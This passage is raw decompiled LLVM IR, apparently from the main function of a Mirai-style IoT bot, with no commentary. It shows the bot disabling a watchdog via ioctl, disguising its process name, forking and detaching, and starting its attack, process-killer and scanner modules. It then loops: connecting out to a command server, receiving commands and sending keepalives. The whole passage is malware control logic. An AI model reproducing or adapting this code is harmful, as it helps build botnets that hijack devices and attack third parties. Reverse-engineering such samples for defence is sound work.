  %v2_ece0 = call i32 @__GI_sigaddset(i32 %v2_ecbc, i32 2)
  store i32 0, i32* %r2.global-to-local, align 4
  %v4_ecf0 = call i32 @__GI_sigprocmask(i32 0, i32* nonnull %stack_var_-64, i32 0)
  %v2_ecfc = call i32 @bsd_signal(i32 17, i32 1)
  %v2_ed08 = call i32 @bsd_signal(i32 5, i32 60076)
  %v3_ed14 = call i32 @__libc_open(i32 ptrtoint ([14 x i8]* @global_var_1b43c.138 to i32), i32 2)
  %v7_ed18 = icmp eq i32 %v3_ed14, -1
  store i32 %v3_ed14, i32* @r4, align 4
  br i1 %v7_ed18, label %dec_label_pc_ee90, label %dec_label_pc_ed24

dec_label_pc_ed24:                                ; preds = %dec_label_pc_ee90, %entry
  %v0_ed38 = phi i32 [ %v3_ee98, %dec_label_pc_ee90 ], [ %v3_ed14, %entry ]
  store i32 1, i32* @r3, align 4
  %v2_ed3c = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_ed3c, i32* %r2.global-to-local, align 4
  store i32 1, i32* %stack_var_-52, align 4
  %v3_ed44 = call i32 @ioctl(i32 %v0_ed38, i32 -2147199228, i32 %v2_ed3c)
  %v0_ed48 = load i32, i32* @r4, align 4
  %v1_ed4c = call i32 @__GI___libc_close(i32 %v0_ed48)
  br label %dec_label_pc_ed50

dec_label_pc_ed50:                                ; preds = %dec_label_pc_ee90, %dec_label_pc_ed24
  %v1_ed54 = call i32 @chdir(i32 ptrtoint (i32* @global_var_1b3ec.32 to i32))
  %v0_ed58 = call i32 @util_local_addr()
  store i32 ptrtoint (i16** @global_var_26e5c.133 to i32), i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_26e50.101 to i32), i32* @fp, align 4
  store i32 902487617, i32* @global_var_26e60.134, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i16 20480, i16* bitcast (i32* @global_var_26e5e.135 to i16*), align 4
  store i16 2, i16* bitcast (i16** @global_var_26e5c.133 to i16*), align 4
  store i32 %v0_ed58, i32* @global_var_26e50.101, align 4
  %v7_ed80 = call i32 @table_init(i32 %v0_ed58, i32 20480, i32 ptrtoint (i16** @global_var_26e5c.133 to i32), i32 2)
  %v2_ed84 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_ed84, i32* @sl, align 4
  %v1_ed8c = call i32 @__GI_raise(i32 5)
  %v1_ed90 = call i32 @ensure_single_instance(i32 %v1_ed8c)
  %v1_ed94 = call i32 @rand_init(i32 %v1_ed90)
  %v2_eda0 = call i32 @util_zero(i32 %v2_ed84, i32 32)
  %v0_eda4 = load i32, i32* @r5, align 4
  %v7_eda4 = icmp eq i32 %v0_eda4, 2
  br i1 %v7_eda4, label %dec_label_pc_eeac, label %dec_label_pc_edac

dec_label_pc_edac:                                ; preds = %dec_label_pc_eeac, %dec_label_pc_ed50, %dec_label_pc_eebc
  %v0_edac = call i32 @rand_next()
  %v1_edb0 = mul i32 %v0_edac, 4
  %v3_edb4 = and i32 %v1_edb0, 12
  %v2_edb8 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_edb8, i32* @r5, align 4
  %v1_edbc = add nuw nsw i32 %v3_edb4, 12
  store i32 %v1_edbc, i32* @r4, align 4
  %v2_edc8 = bitcast i32* %stack_var_-120 to i8*
  %v3_edc8 = call i32 @rand_alphastr(i8* %v2_edc8, i32 %v1_edbc)
  %v2_edcc = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_edcc, i32* %ip.global-to-local, align 4
  %v1_edd0 = load i32, i32* @r4, align 4
  %v2_edd0 = add i32 %v1_edd0, %v2_edcc
  store i32 %v2_edd0, i32* %r3.global-to-local, align 4
  %v0_edd4 = load i32, i32* @r6, align 4
  %v1_edd4 = inttoptr i32 %v0_edd4 to i32*
  %v2_edd4 = load i32, i32* %v1_edd4, align 4
  store i32 %v2_edd4, i32* @r0, align 4
  store i32 0, i32* @r6, align 4
  %v3_ede0 = add i32 %v2_edd0, -80
  %v4_ede0 = inttoptr i32 %v3_ede0 to i8*
  store i8 0, i8* %v4_ede0, align 1
  %v2_ede4 = inttoptr i32 %v2_edd4 to i8*
  %v3_ede4 = call i32 @util_strcpy(i8* %v2_ede4, i32 %v2_edb8)
  %v0_ede8 = call i32 @rand_next()
  %v3_edf4 = udiv i32 %v0_ede8, 6
  store i32 %v3_edf4, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r3, align 4
  %v3_ee04 = mul i32 %v0_ede8, 4
  %v1_ee08 = add i32 %v3_ee04, 12
  store i32 %v1_ee08, i32* @r4, align 4
  %v3_ee14 = call i32 @rand_alphastr(i8* %v2_edc8, i32 %v1_ee08)
  store i32 %v2_edcc, i32* %r2.global-to-local, align 4
  %v1_ee1c = load i32, i32* @r4, align 4
  %v2_ee1c = add i32 %v1_ee1c, %v2_edcc
  store i32 %v2_ee1c, i32* %r3.global-to-local, align 4
  %v0_ee20 = load i32, i32* @r6, align 4
  %v1_ee20 = trunc i32 %v0_ee20 to i8
  %v3_ee20 = add i32 %v2_ee1c, -80
  %v4_ee20 = inttoptr i32 %v3_ee20 to i8*
  store i8 %v1_ee20, i8* %v4_ee20, align 1
  %v4_ee2c = call i32 @prctl(i32 15, i32 %v2_edb8, i32 %v2_edcc, i32 %v2_ee1c)
  %v1_ee34 = call i32 @table_unlock_val(i32 2)
  %v3_ee44 = call i32 @table_retrieve_val(i32 2, i32* nonnull %stack_var_-48)
  %v3_ee48 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_ee48, i32* @r2, align 4
  %v2_ee54 = call i32 @__GI___libc_write(i32 1, i32 %v3_ee44)
  store i32 1, i32* @r2, align 4
  %v2_ee64 = call i32 @__GI___libc_write(i32 1, i32 ptrtoint (i32* @global_var_1b460.145 to i32))
  %v1_ee6c = call i32 @table_lock_val(i32 2)
  %v0_ee70 = call i32 @__libc_fork()
  %v1_ee74 = load i32, i32* @r6, align 4
  %v7_ee78 = icmp sgt i32 %v0_ee70, %v1_ee74
  br i1 %v7_ee78, label %dec_label_pc_ee7c, label %dec_label_pc_eee4

dec_label_pc_ee7c:                                ; preds = %dec_label_pc_edac
  ret i32 %v1_ee74

dec_label_pc_ee90:                                ; preds = %entry
  %v3_ee98 = call i32 @__libc_open(i32 ptrtoint ([19 x i8]* @global_var_1b44c.147 to i32), i32 2)
  %v3_ee9c = icmp eq i32 %v3_ee98, -1
  store i32 %v3_ee98, i32* @r4, align 4
  br i1 %v3_ee9c, label %dec_label_pc_ed50, label %dec_label_pc_ed24

dec_label_pc_eeac:                                ; preds = %dec_label_pc_ed50
  %v0_eeac = load i32, i32* @r6, align 4
  %v1_eeac = add i32 %v0_eeac, 4
  %v2_eeac = inttoptr i32 %v1_eeac to i32*
  %v3_eeac = load i32, i32* %v2_eeac, align 4
  %v1_eeb0 = inttoptr i32 %v3_eeac to i8*
  %v2_eeb0 = call i32 @util_strlen(i8* %v1_eeb0)
  %v8_eeb8 = icmp sgt i32 %v2_eeb0, 31
  br i1 %v8_eeb8, label %dec_label_pc_edac, label %dec_label_pc_eebc

dec_label_pc_eebc:                                ; preds = %dec_label_pc_eeac
  %v0_eebc = load i32, i32* @r6, align 4
  %v1_eebc = add i32 %v0_eebc, 4
  %v2_eebc = inttoptr i32 %v1_eebc to i32*
  %v3_eebc = load i32, i32* %v2_eebc, align 4
  store i32 %v2_ed84, i32* @r0, align 4
  %v2_eec4 = bitcast i32* %stack_var_-152 to i8*
  %v3_eec4 = call i32 @util_strcpy(i8* %v2_eec4, i32 %v3_eebc)
  %v0_eec8 = load i32, i32* @r6, align 4
  %v1_eec8 = add i32 %v0_eec8, 4
  %v2_eec8 = inttoptr i32 %v1_eec8 to i32*
  %v3_eec8 = load i32, i32* %v2_eec8, align 4
  %v1_eed0 = inttoptr i32 %v3_eec8 to i8*
  %v2_eed0 = call i32 @util_strlen(i8* %v1_eed0)
  %v2_eedc = call i32 @util_zero(i32 %v3_eec8, i32 %v2_eed0)
  br label %dec_label_pc_edac

dec_label_pc_eee4:                                ; preds = %dec_label_pc_edac
  %v1_eee4 = call i32 @__GI_setsid(i32 %v0_ee70)
  %v0_eeec = load i32, i32* @r6, align 4
  %v1_eef0 = call i32 @__GI___libc_close(i32 %v0_eeec)
  %v1_eef8 = call i32 @__GI___libc_close(i32 1)
  store i32 ptrtoint (i32* @global_var_241a4.149 to i32), i32* @sb, align 4
  %v1_ef04 = call i32 @__GI___libc_close(i32 2)
  %v2_ef08 = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_ef08, i32* @r7, align 4
  %v1_ef0c = call i32 @attack_init(i32 %v1_ef04)
  %v1_ef10 = call i32 @killer_init(i32 %v1_ef0c)
  %v0_ef14 = call i32 @scanner_init()
  %v0_ef18 = load i32, i32* @r6, align 4
  %v2_ef1c = ptrtoint i32* %stack_var_-408 to i32
  store i32 %v2_ef1c, i32* @r6, align 4
  %v2_effc = ptrtoint i32* %stack_var_-72 to i32
  %v2_f04c = ptrtoint i32* %stack_var_-168 to i32
  %v2_f228 = ptrtoint i32* %stack_var_-56 to i32
  %v2_f230 = ptrtoint i16* %stack_var_-42 to i32
  %v2_f3a8 = ptrtoint i32* %stack_var_-1432 to i32
  %v2_f24c = ptrtoint i32* %stack_var_-52 to i32
  %v1_f2f4 = bitcast i32* %stack_var_-152 to i8*
  %v2_f2c0 = ptrtoint i32* %stack_var_-88 to i32
  %v1_f2e0 = sub i32 0, %v1_eee4
  br label %dec_label_pc_ef20

dec_label_pc_ef20:                                ; preds = %dec_label_pc_f350, %dec_label_pc_f3d4, %bb53, %dec_label_pc_f2f0, %dec_label_pc_f130, %dec_label_pc_f120, %bb50, %dec_label_pc_f428, %dec_label_pc_f360, %dec_label_pc_f33c, %dec_label_pc_f278, %dec_label_pc_f19c, %dec_label_pc_f0d8, %dec_label_pc_eee4
  %stack_var_-1436.0 = phi i32 [ %v0_ef18, %dec_label_pc_eee4 ], [ %stack_var_-1436.0, %bb50 ], [ %stack_var_-1436.1, %dec_label_pc_f120 ], [ %stack_var_-1436.1, %dec_label_pc_f130 ], [ %stack_var_-1436.1, %bb53 ], [ %stack_var_-1436.1, %dec_label_pc_f360 ], [ %stack_var_-1436.1, %dec_label_pc_f19c ], [ %stack_var_-1436.1, %dec_label_pc_f3d4 ], [ %stack_var_-1436.1, %dec_label_pc_f428 ], [ %stack_var_-1436.1, %dec_label_pc_f0d8 ], [ %stack_var_-1436.1, %dec_label_pc_f2f0 ], [ %stack_var_-1436.1, %dec_label_pc_f33c ], [ %stack_var_-1436.1, %dec_label_pc_f278 ], [ %stack_var_-1436.1, %dec_label_pc_f350 ]
  store i32 0, i32* %stack_var_-280, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_ef2c

dec_label_pc_ef2c:                                ; preds = %dec_label_pc_ef2c, %dec_label_pc_ef20
  %v1_ef30 = phi i32 [ %v1_ef34, %dec_label_pc_ef2c ], [ 4, %dec_label_pc_ef20 ]
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_ef30 = load i32, i32* @r7, align 4
  %v3_ef30 = add i32 %v2_ef30, %v1_ef30
  %v4_ef30 = inttoptr i32 %v3_ef30 to i32*
  store i32 0, i32* %v4_ef30, align 4
  %v0_ef34 = load i32, i32* %r3.global-to-local, align 4
  %v1_ef34 = add i32 %v0_ef34, 4
  store i32 %v1_ef34, i32* %r3.global-to-local, align 4
  %v7_ef38 = icmp eq i32 %v1_ef34, 128
  br i1 %v7_ef38, label %dec_label_pc_ef40, label %dec_label_pc_ef2c

dec_label_pc_ef40:                                ; preds = %dec_label_pc_ef2c
  %v0_ef40 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_ef40, i32* %stack_var_-408, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_ef48

dec_label_pc_ef48:                                ; preds = %dec_label_pc_ef48, %dec_label_pc_ef40
  %v1_ef4c = phi i32 [ %v1_ef50, %dec_label_pc_ef48 ], [ 4, %dec_label_pc_ef40 ]
  store i32 0, i32* @r4, align 4
  %v2_ef4c = load i32, i32* @r6, align 4
  %v3_ef4c = add i32 %v2_ef4c, %v1_ef4c
  %v4_ef4c = inttoptr i32 %v3_ef4c to i32*
  store i32 0, i32* %v4_ef4c, align 4
  %v0_ef50 = load i32, i32* %r3.global-to-local, align 4
  %v1_ef50 = add i32 %v0_ef50, 4
  store i32 %v1_ef50, i32* %r3.global-to-local, align 4
  %v7_ef54 = icmp eq i32 %v1_ef50, 128
  br i1 %v7_ef54, label %dec_label_pc_ef5c, label %dec_label_pc_ef48

dec_label_pc_ef5c:                                ; preds = %dec_label_pc_ef48
  store i32 ptrtoint (i32* @global_var_241a0.128 to i32), i32* %r3.global-to-local, align 4
  %v2_ef60 = load i32, i32* @global_var_241a0.128, align 4
  %v7_ef64 = icmp eq i32 %v2_ef60, -1
  br i1 %v7_ef64, label %dec_label_pc_ef90, label %dec_label_pc_ef6c

dec_label_pc_ef6c:                                ; preds = %dec_label_pc_ef5c
  %v3_ef6c = udiv i32 %v2_ef60, 32
  %v3_ef70 = mul nuw nsw i32 %v3_ef6c, 4
  store i32 %v2_edcc, i32* %ip.global-to-local, align 4
  %v2_ef78 = add i32 %v3_ef70, %v2_edcc
  store i32 %v2_ef78, i32* %r3.global-to-local, align 4
  %v1_ef7c = add i32 %v2_ef78, -240
  %v2_ef7c = inttoptr i32 %v1_ef7c to i32*
  %v3_ef7c = load i32, i32* %v2_ef7c, align 4
  %v1_ef80 = urem i32 %v2_ef60, 32
  %v7_ef88 = shl i32 1, %v1_ef80
  %v8_ef88 = or i32 %v3_ef7c, %v7_ef88
  store i32 %v8_ef88, i32* %r2.global-to-local, align 4
  store i32 %v8_ef88, i32* %v2_ef7c, align 4
  br label %dec_label_pc_ef90

dec_label_pc_ef90:                                ; preds = %dec_label_pc_ef5c, %dec_label_pc_ef6c
  %v2_ef90 = load i32, i32* @global_var_241a4.149, align 4
  store i32 %v2_ef90, i32* @r3, align 4
  %v7_ef94 = icmp eq i32 %v2_ef90, -1
  store i32 ptrtoint (i32* @global_var_241a4.149 to i32), i32* @r8, align 4
  br i1 %v7_ef94, label %dec_label_pc_f1b8, label %dec_label_pc_efa0

dec_label_pc_efa0:                                ; preds = %dec_label_pc_f1b8, %dec_label_pc_ef90, %bb52
  %v2_efa4 = load i8, i8* bitcast (i8** @global_var_24340.152 to i8*), align 4
  %v2_efa8 = icmp eq i8 %v2_efa4, 0
  %v2_f0f4 = load i32, i32* @global_var_241a4.149, align 4
  store i32 %v2_f0f4, i32* %ip.global-to-local, align 4
  %v3_f0f8 = udiv i32 %v2_f0f4, 32
  store i32 %v3_f0f8, i32* %r3.global-to-local, align 4
  br i1 %v2_efa8, label %dec_label_pc_f0f4, label %dec_label_pc_efb0

dec_label_pc_efb0:                                ; preds = %dec_label_pc_efa0
  store i32 %v2_edcc, i32* %r2.global-to-local, align 4
  %v3_efbc = mul nuw nsw i32 %v3_f0f8, 4
  %v2_efc0 = add i32 %v3_efbc, %v2_edcc
  store i32 %v2_efc0, i32* %r3.global-to-local, align 4
  %v1_efc4 = add i32 %v2_efc0, -368
  %v2_efc4 = inttoptr i32 %v1_efc4 to i32*
  %v3_efc4 = load i32, i32* %v2_efc4, align 4
  %v1_efc8 = urem i32 %v2_f0f4, 32
  %v7_efd0 = shl i32 1, %v1_efc8
  %v8_efd0 = or i32 %v3_efc4, %v7_efd0
  store i32 %v8_efd0, i32* %r2.global-to-local, align 4
  store i32 %v8_efd0, i32* %v2_efc4, align 4
  br label %dec_label_pc_efd8

dec_label_pc_efd8:                                ; preds = %dec_label_pc_f0f4, %dec_label_pc_efb0
  %v2_efdc = load i32, i32* @global_var_241a0.128, align 4
  store i32 0, i32* @lr, align 4
  %v0_efe4 = load i32, i32* %ip.global-to-local, align 4
  %v5_efe8 = icmp slt i32 %v0_efe4, %v2_efdc
  br i1 %v5_efe8, label %bb50, label %bb

bb:                                               ; preds = %dec_label_pc_efd8
  br label %bb50

bb50:                                             ; preds = %dec_label_pc_efd8, %bb
  %v0_eff8 = phi i32 [ %v2_efdc, %dec_label_pc_efd8 ], [ %v0_efe4, %bb ]
  store i32 10, i32* %stack_var_-72, align 4
  %v1_eff8 = add i32 %v0_eff8, 1
  store i32 %v2_effc, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_ef1c, i32* %r2.global-to-local, align 4
  %v5_f014 = call i32 @__libc_select(i32 %v1_eff8, i32 %v2_ef08, i32 %v2_ef1c, i32 0, i32 %v2_effc)
  %v8_f018 = icmp eq i32 %v5_f014, -1
  br i1 %v8_f018, label %dec_label_pc_ef20, label %dec_label_pc_f020

dec_label_pc_f020:                                ; preds = %bb50
  %v6_f014 = trunc i32 %v5_f014 to i16
  %v3_f020 = icmp eq i16 %v6_f014, 0
  br i1 %v3_f020, label %dec_label_pc_f028, label %dec_label_pc_f05c

dec_label_pc_f028:                                ; preds = %dec_label_pc_f020
  %v5_f034 = srem i32 %stack_var_-1436.0, 6
  %v4_f03c = sub i32 %stack_var_-1436.0, %v5_f034
  store i32 %v4_f03c, i32* %r3.global-to-local, align 4
  %v2_f044 = icmp eq i32 %v5_f034, 0
  %v1_f048 = add i32 %stack_var_-1436.0, 1
  store i32 %v1_f048, i32* @lr, align 4
  store i32 %v2_f04c, i32* %r2.global-to-local, align 4
  store i16 0, i16* %stack_var_-42, align 2
  br i1 %v2_f044, label %dec_label_pc_f228, label %dec_label_pc_f05c

dec_label_pc_f05c:                                ; preds = %dec_label_pc_f020, %dec_label_pc_f028, %dec_label_pc_f228
  %stack_var_-1436.1 = phi i32 [ %v1_f048, %dec_label_pc_f228 ], [ %v1_f048, %dec_label_pc_f028 ], [ %stack_var_-1436.0, %dec_label_pc_f020 ]
  store i32 ptrtoint (i32* @global_var_241a0.128 to i32), i32* %r3.global-to-local, align 4
  %v2_f060 = load i32, i32* @global_var_241a0.128, align 4
  %v7_f064 = icmp eq i32 %v2_f060, -1
  br i1 %v7_f064, label %dec_label_pc_f090, label %dec_label_pc_f06c

dec_label_pc_f06c:                                ; preds = %dec_label_pc_f05c
  %v3_f06c = udiv i32 %v2_f060, 32
  %v3_f070 = mul nuw nsw i32 %v3_f06c, 4
  store i32 %v2_edcc, i32* %ip.global-to-local, align 4
  %v2_f078 = add i32 %v3_f070, %v2_edcc
  store i32 %v2_f078, i32* %r3.global-to-local, align 4
  %v1_f07c = add i32 %v2_f078, -240
  %v2_f07c = inttoptr i32 %v1_f07c to i32*
  %v3_f07c = load i32, i32* %v2_f07c, align 4
  %v1_f080 = urem i32 %v2_f060, 32
  %v6_f084 = ashr i32 %v3_f07c, %v1_f080
  store i32 %v6_f084, i32* %r2.global-to-local, align 4
  %v1_f088 = urem i32 %v6_f084, 2
  %v2_f088 = icmp eq i32 %v1_f088, 0
  br i1 %v2_f088, label %dec_label_pc_f090, label %dec_label_pc_f2b4

dec_label_pc_f090:                                ; preds = %dec_label_pc_f06c, %dec_label_pc_f05c
  %v2_f094 = load i8, i8* bitcast (i8** @global_var_24340.152 to i8*), align 4
  %v3_f094 = zext i8 %v2_f094 to i32
  store i32 %v3_f094, i32* @r4, align 4
  %v2_f098 = icmp eq i8 %v2_f094, 0
  %v2_f120 = load i32, i32* @global_var_241a4.149, align 4
  br i1 %v2_f098, label %dec_label_pc_f120, label %dec_label_pc_f0a0

dec_label_pc_f0a0:                                ; preds = %dec_label_pc_f090
  %v3_f0a4 = udiv i32 %v2_f120, 32
  store i32 %v2_edcc, i32* %r2.global-to-local, align 4
  %v3_f0ac = mul nuw nsw i32 %v3_f0a4, 4
  %v2_f0b0 = add i32 %v3_f0ac, %v2_edcc
  store i32 %v2_f0b0, i32* %r3.global-to-local, align 4
  %v1_f0b4 = add i32 %v2_f0b0, -368
  %v2_f0b4 = inttoptr i32 %v1_f0b4 to i32*
  %v3_f0b4 = load i32, i32* %v2_f0b4, align 4
  %v1_f0b8 = urem i32 %v2_f120, 32
  %v6_f0bc = ashr i32 %v3_f0b4, %v1_f0b8
  store i32 %v6_f0bc, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_24340.152 to i32), i32* %r3.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_f0c8 = urem i32 %v6_f0bc, 2
  %v2_f0c8 = icmp eq i32 %v1_f0c8, 0
  store i8 0, i8* bitcast (i8** @global_var_24340.152 to i8*), align 4
  store i32 ptrtoint (i32* @global_var_241a4.149 to i32), i32* @r5, align 4
  br i1 %v2_f0c8, label %dec_label_pc_f0d8, label %dec_label_pc_f244

dec_label_pc_f0d8:                                ; preds = %dec_label_pc_f0a0
  store i32 61664, i32* @lr, align 4
  %v1_f0dc = icmp ne i32 %v2_f120, -1
  call void @__pseudo_cond_branch(i1 %v1_f0dc, i32 ptrtoint (i32* @global_var_16390.35 to i32))
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_f0e4 = load i32, i32* @r5, align 4
  %v2_f0e4 = inttoptr i32 %v1_f0e4 to i32*
  store i32 -1, i32* %v2_f0e4, align 4
  %v1_f0ec = call i32 @sleep(i32 1)
  br label %dec_label_pc_ef20

dec_label_pc_f0f4:                                ; preds = %dec_label_pc_efa0
  %v3_f0fc = mul nuw nsw i32 %v3_f0f8, 4
  %v2_f104 = add i32 %v3_f0fc, %v2_edcc
  store i32 %v2_f104, i32* %r3.global-to-local, align 4
  %v1_f108 = add i32 %v2_f104, -240
  %v2_f108 = inttoptr i32 %v1_f108 to i32*
  %v3_f108 = load i32, i32* %v2_f108, align 4
  %v1_f10c = urem i32 %v2_f0f4, 32
  %v7_f114 = shl i32 1, %v1_f10c
  %v8_f114 = or i32 %v3_f108, %v7_f114
  store i32 %v8_f114, i32* %r2.global-to-local, align 4
  store i32 %v8_f114, i32* %v2_f108, align 4
  br label %dec_label_pc_efd8

dec_label_pc_f120:                                ; preds = %dec_label_pc_f090
  %v7_f124 = icmp eq i32 %v2_f120, -1
  store i32 ptrtoint (i32* @global_var_241a4.149 to i32), i32* @r5, align 4
  br i1 %v7_f124, label %dec_label_pc_ef20, label %dec_label_pc_f130

dec_label_pc_f130:                                ; preds = %dec_label_pc_f120
  %v3_f130 = udiv i32 %v2_f120, 32
  %v3_f134 = mul nuw nsw i32 %v3_f130, 4
  store i32 %v2_edcc, i32* @lr, align 4
  %v2_f13c = add i32 %v3_f134, %v2_edcc
  store i32 %v2_f13c, i32* %r3.global-to-local, align 4
  %v1_f140 = add i32 %v2_f13c, -240
  %v2_f140 = inttoptr i32 %v1_f140 to i32*
  %v3_f140 = load i32, i32* %v2_f140, align 4
  %v1_f144 = urem i32 %v2_f120, 32
  %v6_f148 = ashr i32 %v3_f140, %v1_f144
  store i32 %v6_f148, i32* %r2.global-to-local, align 4
  %v1_f14c = urem i32 %v6_f148, 2
  %v2_f14c = icmp eq i32 %v1_f14c, 0
  br i1 %v2_f14c, label %dec_label_pc_ef20, label %dec_label_pc_f154

dec_label_pc_f154:                                ; preds = %dec_label_pc_f130
  %v0_f154 = call i32 @__GI___errno_location()
  %v0_f158 = load i32, i32* @r4, align 4
  %v2_f158 = inttoptr i32 %v0_f154 to i32*
  store i32 %v0_f158, i32* %v2_f158, align 4
  store i32 %v0_f154, i32* @r8, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v2_f16c = load i32, i32* @global_var_241a4.149, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_f178 = call i32 @__libc_recv(i32 %v2_f16c, i32 %v2_f230, i32 2, i32 16386)
  %v7_f17c = icmp eq i32 %v4_f178, -1
  br i1 %v7_f17c, label %dec_label_pc_f350, label %dec_label_pc_f184

dec_label_pc_f184:                                ; preds = %dec_label_pc_f154
  %v2_f184 = icmp eq i32 %v4_f178, 0
  br i1 %v2_f184, label %dec_label_pc_f360, label %dec_label_pc_f18c

dec_label_pc_f18c:                                ; preds = %dec_label_pc_f184
  %v3_f190 = load i16, i16* %stack_var_-42, align 2
  %v4_f190 = sext i16 %v3_f190 to i32
  store i32 %v4_f190, i32* %r2.global-to-local, align 4
  %v2_f194 = icmp eq i16 %v3_f190, 0
  br i1 %v2_f194, label %dec_label_pc_f19c, label %dec_label_pc_f384

dec_label_pc_f19c:                                ; preds = %dec_label_pc_f18c
  %v2_f1a0 = load i32, i32* @global_var_241a4.149, align 4
  %v1_f1a8 = add nsw i32 %v4_f190, 2
  store i32 %v1_f1a8, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_f1b0 = call i32 @__libc_recv(i32 %v2_f1a0, i32 %v2_f230, i32 %v1_f1a8, i32 16384)
  br label %dec_label_pc_ef20

dec_label_pc_f1b8:                                ; preds = %dec_label_pc_ef90
  %v0_f1c0 = load i32, i32* @r4, align 4
  store i32 %v0_f1c0, i32* %r2.global-to-local, align 4
  %v3_f1c4 = call i32 @socket(i32 2, i32 1, i32 %v0_f1c0)
  %v7_f1c8 = icmp eq i32 %v3_f1c4, -1
  store i32 %v3_f1c4, i32* @r5, align 4
  %v1_f1d0 = load i32, i32* @r8, align 4
  %v2_f1d0 = inttoptr i32 %v1_f1d0 to i32*
  store i32 %v3_f1c4, i32* %v2_f1d0, align 4
  br i1 %v7_f1c8, label %dec_label_pc_efa0, label %dec_label_pc_f1d8

dec_label_pc_f1d8:                                ; preds = %dec_label_pc_f1b8
  %v0_f1d8 = load i32, i32* @r4, align 4
  store i32 %v0_f1d8, i32* @r2, align 4
  %v2_f1e0 = call i32 @__libc_fcntl(i32 %v3_f1c4, i32 3)
  %v1_f1e8 = or i32 %v2_f1e0, 2048
  store i32 %v1_f1e8, i32* @r2, align 4
  %v0_f1ec = load i32, i32* @r5, align 4
  %v2_f1f0 = call i32 @__libc_fcntl(i32 %v0_f1ec, i32 4)
  %v2_f1f8 = load i32, i32* @global_var_241a8.126, align 4
  store i32 %v2_f1f8, i32* %r3.global-to-local, align 4
  %v2_f1fc = icmp eq i32 %v2_f1f8, 0
  br i1 %v2_f1fc, label %bb52, label %bb51

bb51:                                             ; preds = %dec_label_pc_f1d8
  br label %bb52

bb52:                                             ; preds = %dec_label_pc_f1d8, %bb51
  %v2_f204 = xor i1 %v2_f1fc, true
  call void @__pseudo_cond_branch(i1 %v2_f204, i32 ptrtoint (i32* @global_var_12560.155 to i32))
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_f210 = load i32, i32* @global_var_241a4.149, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i8 1, i8* bitcast (i8** @global_var_24340.152 to i8*), align 4
  %v4_f220 = call i32 @__libc_connect(i32 %v2_f210, i32 ptrtoint (i16** @global_var_26e5c.133 to i32), i32 16)
  br label %dec_label_pc_efa0

dec_label_pc_f228:                                ; preds = %dec_label_pc_f028
  %v2_f22c = load i32, i32* @global_var_241a4.149, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_f23c = call i32 @__libc_send(i32 %v2_f22c, i32 %v2_f230, i32 2, i32 16384)
  br label %dec_label_pc_f05c

dec_label_pc_f244:                                ; preds = %dec_label_pc_f0a0
  store i32 4, i32* @r4, align 4
  store i32 %v2_f24c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  store i32 %v2_f228, i32* %ip.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 4, i32* %stack_var_-56, align 4
  %v5_f268 = call i32 @getsockopt(i32 %v2_f120, i32 1, i32 4, i32 %v2_f24c, i32 %v2_f228)
  %v3_f26c = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_f26c, i32* %r3.global-to-local, align 4
  %v2_f270 = icmp eq i32 %v3_f26c, 0
  br i1 %v2_f270, label %dec_label_pc_f2f0, label %dec_label_pc_f278

dec_label_pc_f278:                                ; preds = %dec_label_pc_f244
  %v2_f278 = load i32, i32* @global_var_241a4.149, align 4
  %v1_f27c = call i32 @__GI___libc_close(i32 %v2_f278)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_f284 = load i32, i32* @r5, align 4
  %v2_f284 = inttoptr i32 %v1_f284 to i32*
  store i32 -1, i32* %v2_f284, align 4
  %v0_f288 = call i32 @rand_next()
  %v3_f290 = zext i32 %v0_f288 to i64
  %v4_f290 = mul nuw i64 %v3_f290, 3435973837
  %v7_f290 = trunc i64 %v4_f290 to i32
  store i32 %v7_f290, i32* %ip.global-to-local, align 4
  %v3_f2946 = udiv i64 %v4_f290, 34359738368
  %v3_f2988 = mul nuw nsw i64 %v3_f2946, 8
  %v3_f298 = trunc i64 %v3_f2988 to i32
  store i32 %v3_f298, i32* %r2.global-to-local, align 4
  %v2_f29c10 = mul nuw nsw i64 %v3_f2946, 2
  %v2_f29c = trunc i64 %v2_f29c10 to i32
  %v2_f2a0 = add i32 %v3_f298, %v2_f29c
  store i32 %v2_f2a0, i32* %r3.global-to-local, align 4
  %v2_f2a4 = sub i32 %v0_f288, %v2_f2a0
  %v1_f2a8 = add i32 %v2_f2a4, 1
  %v1_f2ac = call i32 @sleep(i32 %v1_f2a8)
  br label %dec_label_pc_ef20

dec_label_pc_f2b4:                                ; preds = %dec_label_pc_f06c
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 %v2_f24c, i32* %r2.global-to-local, align 4
  store i32 16, i32* %stack_var_-52, align 4
  %v5_f2c8 = call i32 @__libc_accept(i32 %v2_f060, i32 %v2_f2c0, i32 %v2_f24c, i32 16, i32 16)
  %v1_f2cc = call i32 @scanner_kill(i32 %v5_f2c8)
  %v1_f2d0 = call i32 @killer_kill(i32 %v1_f2cc)
  %v1_f2d4 = call i32 @attack_kill_all(i32 %v1_f2d0)
